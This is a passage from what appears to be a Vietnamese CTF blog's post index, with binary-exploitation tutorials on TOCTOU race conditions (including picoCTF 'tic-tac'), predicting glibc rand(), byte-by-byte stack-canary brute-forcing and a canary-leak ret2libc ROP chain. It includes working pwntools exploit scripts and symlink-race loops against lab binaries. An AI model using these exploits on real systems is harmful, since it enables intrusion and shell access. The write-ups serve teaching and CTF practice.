hiện multitask. Điều này giống như việc đang mở một task Discord và một task Chrome. Máy tính sẽ gây cho ta một ngộ nhận là các task này hoạt động song song với nhau nhưng thực chất là từng process trong task của Discord sẽ đan xen với từng process trong task của Chrome. Nhưng do tốc độ hoạt động của CPU quá nhanh nên ta nhầm tưởng chúng hoạt động song song. Điều này \"khá tương tự\" cách mắt bạn thấy ánh sáng từ đèn huỳnh quang. Về bản chất là nó chớp rồi tắt nhưng do dòng điện xoay chiều có tần số lớn nên mình tưởng nó luôn sáng.\n\n![](https://hackmd.io/_uploads/Bk1baU-K3.png)\n\nHình 1 : Việc một process thực hiện đơn lẽ\n\n![](https://hackmd.io/_uploads/BJ_NpLZK2.png)\n\nHình 2 : Lầm tưởng chạy 2 process song song\n\n![](https://hackmd.io/_uploads/Sk9Ia8ZF3.png)\n\nHình 3 : Thực chất việc máy tính xử lý. Việc chuyển từ công việc của một process này sang công việc của một process khác được gọi là context switch\n\n\n### TOCTOU\n\nĐây là một số khả năng khi ta chạy đa luồng 2 process cùng access vào 1 file:\n\n![](https://hackmd.io/_uploads/SJ2MA8ZY3.png)\n\nMột trong số các khả năng đấy sẽ có tìm ẩn nguy hiểm. Ta thấy khả năng đầu tiên như sau\n\n![](https://hackmd.io/_uploads/Hy_cCI-F3.png)\n\nP1 và P2 cùng `check_input` trong cùng một môi trường sau đó P1 `do_action` với môi trường đó rồi sau đấy P2 lại `do_action` với môi trường đã bị P1 thay đổi => có bug\n\nTrong khả năng thứ 2 thì lại an toàn do thực hiện xong process này mới tới process khác\n\n![](https://hackmd.io/_uploads/rJFF7w-Fn.png)\n\nTrong các trường hợp còn lại thì process sau đều thực hiện `do_action` mà không `check_input` lại sau khi các process trước đó đã có tác động tới môi trường => có bug\n\n![](https://hackmd.io/_uploads/BJ4_LwbKn.png)\n\n## Setup, demo\n### Setup\n\nĐầu tiên tạo file cần test và combile nó. Ở đây mình tạo file `vuln.c` \n\n```clike=\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <libgen.h>\n#include <stddef.h>\n#include <fcntl.h>\nint main( int argc, char **argv)\n{\n    int fd = open(argv[1],O_WRONLY | O_CREAT | O_TRUNC,0755);\n    write(fd,\"#!/bin/sh\\necho SAFE\\n\",20);\n    close(fd);                      \n    execl(\"/bin/sh\",\"/bin/sh\",argv[1],NULL);\n}\n```\n\n![](https://hackmd.io/_uploads/rJ9jaw-F3.png)\n\nCode này sẽ ghi bash script vào file đến từ argument đầu của ta và thực thi nó\n\nTiếp theo tạo thêm flag, file để test exploit : \n\n- file flag\n- file catflag là bash script dùng để cat flag\n```bash!\n#!/bin/sh\ncat flag\n```\n\n![](https://hackmd.io/_uploads/SJT6qFWt2.png)\n\n\n### Demo exploit\n#### Bài setup \nỞ đây ta chia hướng hoạt động của chương trình thành 3 việc nhỏ:\n - Mở file từ argument đầu\n - Ghi file\n - Thực thi file\n\nTa có nhận xét là chương trình không check việc file đang thực thi có đúng là file ta đã mở không nên có có thể tấn công bằng TOCTOU nhờ vào file `catflag` cho sẵn.\n\n![](https://hackmd.io/_uploads/HkO1SdbK2.png)\n\nTa có hướng tấn công như sau : tạo một process chạy song song để ghi đè `cat flag` vào sau khi process gốc thực hiện xong việc \"ghi file\". Để thực hiện được điều đó ta cần timing hợp lý (tuỳ vào nhân phẩm).\n\n![](https://hackmd.io/_uploads/r1gGXuZF2.png)\n\n\nDo đó ta viết shell script để spam việc copy content của file `catflag` sang file `test` tạo ra từ chương trình\n\n```bash!\n while /bin/true; do cp -v catflag test;done\n```\n\n![](https://hackmd.io/_uploads/HkKTotZF3.png)\n\nSau đó ta mở tab khác để chạy chương trình gốc.\n\n![](https://hackmd.io/_uploads/BJXV2Kbth.png)\n\nTa có nhận xét là không phải cứ chạy là rà flag mà tuỳ vào thời cơ.\n\n#### tic-tac (PICO-CTF-2023)\nĐề bài cho ta 3 file gồm: flag.txt, src.cpp và file binary txtreader.\n\nFile source như sau:\n```clike=\n#include <iostream>\n#include <fstream>\n#include <unistd.h>\n#include <sys/stat.h>\n\nint main(int argc, char *argv[]) {\n  if (argc != 2) {\n    std::cerr << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n    return 1;\n  }\n\n  std::string filename = argv[1];\n  std::ifstream file(filename);\n  struct stat statbuf;\n\n  // Check the file's status information.\n  if (stat(filename.c_str(), &statbuf) == -1) {\n    std::cerr << \"Error: Could not retrieve file information\" << std::endl;\n    return 1;\n  }\n\n  // Check the file's owner.\n  if (statbuf.st_uid != getuid()) {\n    std::cerr << \"Error: you don't own this file\" << std::endl;\n    return 1;\n  }\n\n  // Read the contents of the file.\n  if (file.is_open()) {\n    std::string line;\n    while (getline(file, line)) {\n      std::cout << line << std::endl;\n    }\n  } else {\n    std::cerr << \"Error: Could not open file\" << std::endl;\n    return 1;\n  }\n\n  return 0;\n}\n```\n\nTa cũng có thể chia cách hoạt động của chương trình thành 3 hướng như sau:\n- Nhận input\n- Check input\n- Mở input \n\nDo ở đây không có sẵn file nào giúp \"thay thế\" như trên nên ta sẽ lợi dụng bằng linking (ln) qua một file thứ 3.\n\nTa chia công việc linking thành 2 phần như sau\n- Link file `test` với file `src.c` bằng `ln -sf test src.c`\n- Link file `test` với file `flag.txt` bằng `ln -sf test flag.txt`\n\nMục đích của ta là chạy 2 chương trình cùng lúc để trigger context giống ảnh\n\n![](https://hackmd.io/_uploads/SJ1hf9bF2.png)\n\nDo file `src.cpp` khá dài nên mình `ln` qua file thứ 3 tên `lmao`, về bản chất thì logic không thay đổi .\n\n![](https://hackmd.io/_uploads/r1s0dqWY2.png)\n\nTiếp theo mình chạy lệnh này để thực hiện việc spam `ln` liên tiếp. Trong đó dấu `&` cuối cho phép ta thực hiện tiếp mà không phải đợi lệnh này xong. \n\n```bash\nwhile true ; do ln -sf flag.txt test; ln -sf lmao test;done &\n```\nCuối cùng chạy lệnh này để trigger toctou bằng cách spam tiếp chương trình gốc\n```bash\nfor i in {1..100}; do ./txtreader test ;done\n```\n\n![](https://hackmd.io/_uploads/HyJ6tqZF2.png)\n\nVà hên là ta đã có flag\n\n## Tham khảo\n1. [pwn.college](https://pwn.college/system-security/race-conditions)\n2. [Exploiting a Race Condition](https://samsclass.info/127/proj/E10.htm)","tags":["linux","toctou","race condition"],"categories":["pwn"]},{"title":"rand() vulnerability","url":"/2023/05/12/rand-vuln/","content":"# rand() vulnerability\n\n## Vấn đề\nGiả sử ta có đoạn code sau đây được compile bằng `gcc -o rand rand.c`\n\n```cpp=\n#include <stdio.h>\nint main()\n{\n        int input ;\n        scanf(\"%d\",&input) ;\n        srand(time(NULL));\n        if (rand() == input) system(\"/bin/sh\");\n        else puts(\"NOOB\") ;\n        return 0 ;\n}\n```\n\nMục đích của ta là làm sao để input bằng output của `rand()` trong C. Để giải quyết được bài toán này, ta sẽ tìm hiểu sơ lược về pseudorandom number generator (PRNG) cũng như cách hàm `rand()` được implement trong glibc.\n\n## Điều gì làm một số random là một số random ?\n### Pseudorandom number generator\nHiểu một cách đơn giản, số random thực sự là một số được tạo ra hoàn toàn ngầu nhiên, không sinh ra dựa trên quy luật hay bất kỳ mục đích nào cả. Ví dụ đơn giản nhất chính là mật độ khí $O_2$ hiện tại trong phòng bạn, tiếng ồn ở một nơi bất kỳ, tung xí ngầu,... Và vì thế, các trường hợp mà bạn có khả năng điều khiển các dữ kiện gốc hay nói một cách khác là tạo ra dựa trên một quy luật, một thuật toán sinh nào đó thì được gọi là PRNG.\n\nĐể phục vụ nhu cầu tạo số random trên máy tính người ta đã đến với một giải pháp là sử dụng deterministic algorithm để tạo ra một số trong có vẻ là random nhưng thực chất là không random. Một trong những cách để implement nó chính là sử dụng linear congruential generator, và cách này được sài ở hàm rand() trong C.\n\n### Linear congruential generator (LCG)\nThuật toán này nhằm mục đích tạo ra một số random dựa trên một seed cho trước. Điều này đồng nghĩa với việc nếu ta lấy cùng một seed đó để sinh ra trong mỗi lần chạy chương trình thì vẫn được các số random ra y chang nhau.\n\nCông thức truy hồi của LCG như sau:\n$x_{n+1} = (ax_n + c) \\mod m$\n\nTrong đó : \n- $x_n$ là số random trước đó\n- $x_{n+1}$ là số random sẽ được tạo ra\n- $a, c, m$ là hằng số quyết định tính chất của số random\n- $x_0$ là seed được cung cấp.\n\n## rand() trong glibc\n\nHàm `rand()` trong C sẽ gọi tới`__random()` và `__random_r()` sẽ đảm nhận việc tạo ra số random\n\n![](https://hackmd.io/_uploads/SyB-yEs43.png)\n\n![](https://hackmd.io/_uploads/rJeukVoN2.png)\n\nTrong đó, `__random_r()` sử dụng 2 cơ chế để random, single state (khúc trong if TYPE_0) và khúc multistate (mình tự gọi). \n\nSingle state là thuật toán đơn giản vì chỉ sử dụng duy nhất một \"kiểu\" sinh. Thuật toán này có khuyết điểm là với một số nào đó được sinh ra thì ta sẽ gặp lại số đó sau $2^{31}$ lần gọi `rand()`. Cách này được gọi là `TYPE_0` trong source glibc.\n\nMultistate cho phép ta gặp lại số trùng nhau do đã có một vài cải tiến so với thuật toán trên. State này hoạt động như sau : \n\nVới một seed s, và mảng $r_0...r_{33}$, số được sinh ra sẽ thoả:\n- $r_0 = s$\n- $r_i = (16807 \\times (\\text{signed int}) r_{i-1}) \\mod 2147483647$ (i = 1 ... 30)\n- $r_i = r_{i-31}$ (i = 31...33) \n\nTừ $r_{34}$ trở đi thuật toán sẽ thành:\n- $r_i = (r_{i-3} + r_{i-31}) \\mod 4294967296$ (i ≥ 34)\n\nKết quả hàm rand() thứ i sẽ là: $r_i + 344 >> 1$\nKhi ta set seed bằng `srand()` thì sẽ mặc định sài cái multistate\nTa có code chạy multistate được viết lại như sau:\n```cpp=\n#include <stdio.h>\n\n#define MAX 1000\n#define seed SET_YOURS\n\nmain() {\n  int r[MAX];\n  int i;\n\n  r[0] = seed;\n  for (i=1; i<31; i++) {\n    r[i] = (16807LL * r[i-1]) % 2147483647;\n    if (r[i] < 0) {\n      r[i] += 2147483647;\n    }\n  }\n  for (i=31; i<34; i++) {\n    r[i] = r[i-31];\n  }\n  for (i=34; i<344; i++) {\n    r[i] = r[i-31] + r[i-3];\n  }\n  for (i=344; i<MAX; i++) {\n    r[i] = r[i-31] + r[i-3];\n    printf(\"%d\\n\", ((unsigned int)r[i]) >> 1);\n  }\n}\n\n```\n\nNếu bạn compile rồi chạy thử code trên thì số được tạo ra sẽ y chang khi sài `rand()`\n## Khai thác\nVậy ta đã biết sơ lược về cách hàm `rand()` hoạt động trong C. Với code đề bài đưa ra, ta có nhận xét là seed được tạo ra chính là thời điểm ta kết nối với server. Trong python có một thư viện hữu ích Ctypes, cho phép sử dụng các hàm có sẵn trong C (nếu bạn không thích sài thì code lại nguyên hàm `time()` cũng như `rand()` cũng được). Ở đây ta thấy `time()` sẽ được tính kể từ thời điểm chương trình gọi nó, do vậy khi code python ta chạy thì hên xui sẽ có một độ delay nhất định so với server. Do vậy nếu không được ta sẽ thử từng `time+1, time+2,...` để đồng bộ.\n\nScript : \n```python=\nfrom pwn import *\nfrom ctypes import CDLL\n\nlibc = CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = remote(\"localhost\",6666)\nlibc.srand(libc.time(0))\np.sendline(str(libc.rand()))\np.interactive()\n```\nỞ đây hên là code mình đồng bộ với server luôn. Chạy và ta có được shell \n\n![](https://hackmd.io/_uploads/BkStiViN2.png)\n\n## References\n1. [The GLIBC random number generator](https://www.mscs.dal.ca/~selinger/random/)\n2. [glibc rand function implementation](https://stackoverflow.com/questions/18634079/glibc-rand-function-implementation)\n3. [rand() source](https://codebrowser.dev/glibc/glibc/stdlib/random_r.c.html#35buf)\n","tags":["linux","rand"],"categories":["pwn"]},{"title":"Bruteforce Stack Canary x86-64 Linux","url":"/2023/04/28/bruteforce-canary/","content":"# Bruteforce Stack Canary x86-64 Linux\n\n## Giới thiệu\nNhư ở bài [trước](https://hackmd.io/OgqVhSZZR3CCszA9GwcrTA) ta đã biết được stack canary là một cơ chế để ngăn chặn buffer overflow. Đây là một giá trị để trước return address và được check trước khi return 1 stack frame nhằm tránh overflow. Do đó để chuyển hướng hoạt động của chương trình, ta cần tấn công bằng 1 trong 2 cách sau: leak hoặc bruteforce stack canary. Trong bài này sẽ tấn công bằng cách thứ 2.\n\n## Chương trình khai thác\n<details>\n<summary>CODE </summary>\n    \n```clike\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#define PORT 6969\nint client = 0  ;\n\nvoid vuln(int client_socket) {\n    char *output = \"vuln read : \";\n    char n[10] ;\n    send(client_socket, output, strlen(output), 0);\n    read(client_socket,n,0x1000);\n\n}\n\nvoid win()\n{\n        send(client,\"YOU WIN\",strlen(\"YOU WIN\"),0) ;\n}\n\nint main() {\n    int server_fd, new_socket, valread;\n    struct sockaddr_in address;\n    int addrlen = sizeof(address);\n\n    // Create socket file descriptor\n    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {\n        perror(\"socket failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Set socket options\n    int opt = 1;\n    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,\n                   &opt, sizeof(opt))) {\n        perror(\"setsockopt\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Bind socket to port\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(PORT);\n\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\n        perror(\"bind failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Listen for incoming connections\n    if (listen(server_fd, 3) < 0) {\n        perror(\"listen\");\n        exit(EXIT_FAILURE);\n    }\n\n    while (1) {\n        // Accept incoming connection\n        if ((new_socket = accept(server_fd, (struct sockaddr *)&address,\n                                 (socklen_t *)&addrlen)) < 0) {\n            perror(\"accept\");\n            exit(EXIT_FAILURE);\n        }\n\n        // Fork a new process to handle the connection\n        pid_t pid = fork();\n        if (pid < 0) {\n            perror(\"fork failed\");\n            exit(EXIT_FAILURE);\n        } else if (pid == 0) {\n            // Child process\n            close(server_fd);\n\n            // Call prog function and send output to client\n            client = new_socket ;\n            vuln(new_socket);\n            send(new_socket,\"NO OVERFLOW\\n\",strlen(\"NO OVERFLOW\\n\"),0);\n            close(new_socket);\n            exit(EXIT_SUCCESS);\n        } else {\n            // Parent process\n            close(new_socket);\n        }\n    }\n\n    return 0;\n}\n```\n</details>\n\nGiả sử đây là chương trình chạy trên server và được build bằng lệnh `gcc -o test test.c -no-pie`.\n\nĐọc code thì ta thấy hướng hoạt động của chương trình trên như sau: chương trình tạo socket cho client kết nối ở `localhost 6969` (chạy local trên máy) sau đó với mỗi client kết nối nó sẽ `fork()` chính process này cho client. Ngoài ra ta dễ dàng thấy có lỗi BOF ở `vuln`\n\nTiếp theo ta tham khảo hàm `fork()`\n    \n![](https://i.imgur.com/60jZiEO.png)\n\nĐây là một syscall trên linux cho phép ta dublicate process gọi nó. Process con sẽ được spawn ra có cùng content với parent. Điều này đồng nghĩa với giá trị stack canary cũng không đổi\n\n![](https://i.imgur.com/GMiVnyc.png)\n\nDo đó ta có thể lợi dụng nó để bruteforce stack canary\n    \n## Bruteforce\nTa biết được canary ở x86-64 là một số 8 byte mà byte cuối luôn tận cùng là `/x00`\n    \n![](https://i.imgur.com/6ujrdrt.png)\n\nDo đó sẽ có ít nhất `255^7` tức `70110209207109375` giá trị tồn tại. Vì vậy nếu thử từng số thì không biết khi nào mới xong.\n\nCho nên ta sẽ sài một hướng khác, và hướng này chính là bruteforces từng byte. Khi ta thử từng byte như vậy, nếu một byte không thoả thì chương trình sẽ exit và báo lỗi, nếu thoả thì chương trình thực thi tiếp và ta sẽ lưu lại byte đó để bruteforce byte kế tiếp.\n\n![](https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif)\n    \nCách này tối ưu hơn vì 1 byte có 255 giá trị, và ta có 7 byte cần bruteforce do đó sẽ có nhiều nhất : `255+255+255+255+255+255+255 (1785)` lần thử, và nó thấp đáng kể so với cách kia\n    \n## Exploit\nTa đã biết hướng khai thác vậy ta sẽ viết script\n\nĐầu tiên ta gdb để tìm offset. Do ta cần debug child process sinh ra từ `fork()` nên ta cần để lệnh này trong gdb\n\n![](https://i.imgur.com/D8B5Usw.png)\n\nTa nhận thấy ta cần padding 10 byte rồi tới stack canary, sau đó là padding thêm 8 byte, cuối cùng là return address \n\n![](https://i.imgur.com/PY2GOVB.png)\n\nTiếp theo ta viết script bruteforce bằng python như sau\n    \n```python\ndef brute_cana():\n        p = remote(\"localhost\",6969)\n        payload = 'A'*10\n        canary = \"\\x00\"\n        for step in range(0,7):\n                for i in range(0,256):\n                        leak = b\"\"\n                        try:\n                                sent = payload + canary + chr(i)\n                                p.sendafter(b'vuln read : ',sent)\n                                leak = p.recvline()\n                        except EOFError:\n                                p.close()\n                                p.clean()\n                                p = remote(\"localhost\",6969)\n\n                        if (len(leak) > 3) :\n                                canary += chr(i)\n                                break\n\n        print(\"[+] Canary =\",hex(u64(canary)))\n        return u64(canary)\n```\n\nỞ đây ta tạo một hàm tên `brute_cana`, sau đó ta kết nối với host bruteforce từng byte, nếu bị sai ở byte nào thì ta tiến hành kết nối lại và thực hiện tiếp quá trình trên. Ở đây nếu 1 byte bruteforce thành công thì server sẽ send `NO OVERFLOW` không thì không có gì nên ta lợi dụng nó để biết khi nào làm tiếp byte tiếp theo.\n\nTiếp theo ta chạy thử thì được canary.\n\n![](https://i.imgur.com/f0gOgFa.png)\n\nVậy tới đây ta lo được canary, việc còn lại là overwrite return address bằng ret2libc để lấy shell hay ở đây mình ret2win để minh hoạ.\n\nĐịa chỉ hàm `win`\n    \n![](https://i.imgur.com/tBUVMVF.png)\n\nỞ đây ta thấy cần padding 8 byte rồi mới tới ret address\n![](https://i.imgur.com/o9TcgVc.png)\n\nCuối cùng viết script:\n```python\ndef get_shell():\n        p = remote(\"localhost\",6969)\n        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)\n\n        p.sendafter(b'vuln read : ',payload)\n        p.interactive()\n```\n\n- Full script:\n```python\nfrom pwn import *\n#exe = ELF(\"test\")\n\ndef brute_cana():\n        p = remote(\"localhost\",6969)\n        payload = 'A'*10\n        canary = \"\\x00\"\n        for step in range(0,7):\n                for i in range(0,256):\n                        leak = b\"\"\n                        try:\n                                sent = payload + canary + chr(i)\n                                p.sendafter(b'vuln read : ',sent)\n                                leak = p.recvline()\n                        except EOFError:\n                                p.close()\n                                p.clean()\n                                p = remote(\"localhost\",6969)\n\n                        if (len(leak) > 3) :\n                                canary += chr(i)\n                                break\n\n        print(\"[+] Canary =\",hex(u64(canary)))\n        return u64(canary)\n\ndef get_shell():\n        p = remote(\"localhost\",6969)\n        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)\n\n        p.sendafter(b'vuln read : ',payload)\n        p.interactive()\n\nif __name__ ==  \"__main__\":\n        get_shell()\n```\n\nChạy thử và ta overwrite thành công\n\n![](https://i.imgur.com/aoHxGyj.png)\n\n## References\n1. [Brute-Forcing x86 Stack Canaries](https://bananamafia.dev/post/binary-canary-bruteforce/)\n2. [Fork linux man page](https://man7.org/linux/man-pages/man2/fork.2.html)","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"Stack canary - Một cơ chế ngăn chặn Buffer Overflow","url":"/2023/04/07/stack-canary/","content":"# Stack canary - Một cơ chế ngăn chặn Buffer Overflow\nViệc tấn công bằng cách lợi dụng buffer overflow đầu tiên có thể đã xuất hiện từ đầu những năm 1980 và được biết đến nhiều nhất do Robert Tappan Morris, người đã tạo ra một loại worm tự nhân bản bằng cách khai thác lỗ hổng trên trong chương trình sendmail ở hệ thống các máy Unix. Hiện nay, đã xuất hiện nhiều cơ chế để ngăn chặn lỗi buffer overflow trên các máy Unix, một trong những cơ chế đó chính là stack canary.\n\n![](https://i.imgur.com/eZOslMD.png)\nHình 1: Stack Canary ở stack\n## Stack Canary là gì?\nVào những năm 1900 thì việc đào mỏ là một trong những công việc nguy hiểm vì lượng khí CO trong đây rất khó phát hiện bởi nó không mùi. Để giải quyết vấn đề đó thì những người thợ thường đem theo một loại chim \"canary\" theo. Con chim này có ngưỡng hấp thụ khí CO ít hơn con người nên một khi nó gặp vấn đề gì trước thì ta có thể đi ra trước một cách an toàn.\n\n![](https://i.imgur.com/50GSpgY.png)\nHình 2: Chim canary\n\nVới cùng một chức năng tương đồng như vậy, stack canary là một cơ chế bảo mật được thiết kế để phát hiện các cuộc tấn công bằng buffer overflow. Nó là một giá trị bất kỳ và luôn tận cùng bằng byte 00,được lưu trữ trên ngăn xếp, được đặt giữa `buffer` và `return address`, hoạt động như một người bảo vệ. Trước khi một hàm return, nó sẽ kiểm tra để đảm bảo rằng giá trị của canary không thay đổi. Nếu giá trị canary đã thay đổi, nó chỉ ra rằng đã xảy ra lỗi buffer overflow và chương trình sẽ kết thúc ngay lập tức.\n\n![](https://i.imgur.com/Mht2XDg.png)\nHình 3: stack canary khi phát hiện có thay đổi do buffer overflow\n\n## Cách Stack Canary hoạt động\nKhi gọi bất kỳ một hàm nào thì canary sẽ được khởi tạo ở đầu stack frame\n\n![](https://i.imgur.com/Jy2FNxb.png)\nHình 4: canary được khởi tạo\n\nVà khi return  sẽ được check lại\n\n![](https://i.imgur.com/l3HfbnG.png)\nHình 5: check canary\n\nTrong quá trình check ở hình trên, hàm đưa `fs:0x28` tức canary gốc vào register `rax` rồi check với canary ban đầu được đưa vào stack ở `[rbp-0x8]`. Nếu khác sẽ gọi `__stack_chk_fail@plt` để đưa về màn hình như *Hình 3*\nCanary được mặc định là bật khi compile bằng gcc. Để disasble nó ta có thể thêm argument `-fno-stack-protector` khi compile.\n\n## Lợi ích\n\nƯu điểm lớn nhất của stack canary là nó dễ cài đặt (bật mặc định) và nó add thêm một layer bảo vệ cho phần mềm. Giá trị canary được tạo ngẫu nhiên và thay đổi mỗi khi chương trình được thực thi do đó khiến kẻ tấn công khó dự đoán nó. Ngoài ra, stack canary cũng có thể giúp debug chương trình nhanh hơn. Nếu ta vô tình thay đổi canary thì nó sẽ thoát ngay lặp tức giúp ta dễ dàng nhận diện lỗi. \n\n## Tấn công\nHiện nay có 2 cách phổ biến nhất để tấn công chương trình có stack canary: Brute force và Leak \n### Brute forces\nĐối với chương trình 32-bit thì canary có thể nhận giá trị từ 0 -> 2^32-1 (hơn 4 tỷ chút) và số này còn lớn hơn đối với các chương trình 64-bit. Việc khai thác bằng brute force theo lý thuyết là được nhưng thực tế vào các bài CTF thì chắc chắn không thể.\n### Leak\nĐây là cách phổ biến nhất và tối ưu nhất. Ở đây mình sẽ demo qua chall [bof4chall2](https://drive.google.com/file/d/1dQNtPmXNP2wsTL_3H2_jRfEALedMpCOW/view) của anh Quí\n- Bài cho ta 1 file binary\n- Đầu tiên ta checksec. Nhận thấy canary bật và No PIE\n    \n![](https://i.imgur.com/SpgymX1.png)\n\n- Tiếp theo vào IDA để xem thử. Nhận thấy có lỗi buffer overflow ở hàm vuln. Các biến bị overflow gồm : `buf`,`v3`\n\n![](https://i.imgur.com/qXDhSjI.png)\n\n- Hàm `puts` sẽ in đến khi nào gặp null byte và trước đó có biến `buffer` bị overflow nên ta sẽ lợi dụng nó để leak canary\n- Vào GDB tìm offset. Ta thấy ta cần tìm chọn padding là `0x007fffffffdf88-0x007fffffffdf78 +1` tức 17 byte (cộng 1 vì để xoá byte 00 - nếu không thì puts sẽ dừng trước đó)\n\n![](https://i.imgur.com/AyJESSI.png)\n\n- Viết script để check : \n\n```python\np.sendlineafter(b'name ?\\n',b'a'*17)\np.recvuntil(b'\\x0a')\nleak = u64(b'\\x00'+ p.recvn(7))\nprint('canary : ',hex(leak))\n```\n\n- Chạy thử thì ta leak đúng canary \n\n![](https://i.imgur.com/UNQEb3C.png)\n\n- Sau khi leak canary xong thì bài này chỉ là một bài ret2libc cơ bản. Ở đây mình sẽ tìm gadget pop_rdi ret để ROP chain không sài one_gadget.\n- Full script: \n```python\nfrom pwn import *\nexe = ELF(\"bof4chall2\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(exe.path)\np.sendlineafter(b'name ?\\n',b'a'*17)\np.recvuntil(b'\\x0a')\nleak = u64(b'\\x00'+ p.recvn(7))\nprint('canary : ',hex(leak))\npop_rdi_ret = 0x00000000004013b3\npayload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])\n\np.sendlineafter(b'rop ?\\n',payload)\np.recvuntil(b'enabled?\\n')\nlibc_leak = u64(p.recvline()[:-1] + b'\\x00\\x00')\nlibc.address = libc_leak - 528080\n\np.sendlineafter(b'name ?\\n',b'a')\npayload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret)+p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system'])\np.sendlineafter(b'rop ?\\n',payload)\np.interactive()\n```\n- Chạy script trên ta sẽ có shell\n\n![](https://i.imgur.com/H34E0CO.png)\n\n## Tài liệu tham khảo\n1. [Stack Canary YT](https://www.youtube.com/watch?v=N7kGd76evsM&ab_channel=AaronYoo)\n2. [CTF101](https://ctf101.org/binary-exploitation/stack-canaries/)\n3. [Wiki](https://en.wikipedia.org/wiki/Buffer_overflow#:~:text=The%20earliest%20documented%20hostile%20exploitation,service%20on%20Unix%20called%20finger.)","tags":["linux"],"categories":["pwn","stack overflow"]}]